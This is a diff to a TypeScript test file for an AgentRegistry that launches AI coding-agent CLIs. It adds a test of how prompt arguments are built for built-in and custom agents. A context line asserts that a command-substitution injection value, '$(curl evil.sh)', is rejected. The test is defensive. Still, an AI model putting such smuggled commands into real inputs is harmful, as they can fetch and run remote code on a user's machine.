@@ -21,3 +21,16 @@ test('unregistered / injection payloads are rejected', () => {
   assert.equal(r.isRegistered('$(curl evil.sh)', []), false);
   assert.equal(r.isRegistered('', []), false);
 });
+
+import { promptArgs, AgentRegistry as Reg } from './AgentRegistry.js';
+
+test('promptArgs: built-ins and custom agents', () => {
+  const r = new Reg();
+  const get = (id: string) => r.getById(id, [])!;
+  assert.deepEqual(promptArgs(get('claude'), 'hi'), ['hi']);
+  assert.deepEqual(promptArgs(get('codex'), 'hi'), ['hi']);
+  assert.deepEqual(promptArgs(get('gemini'), 'hi'), ['-i', 'hi']);
+  const custom = { id: 'x', name: 'X', command: 'x', builtin: false };
+  assert.equal(promptArgs(custom, 'hi'), null);
+  assert.deepEqual(promptArgs({ ...custom, promptFlag: '--prompt' }, 'hi'), ['--prompt', 'hi']);
+});
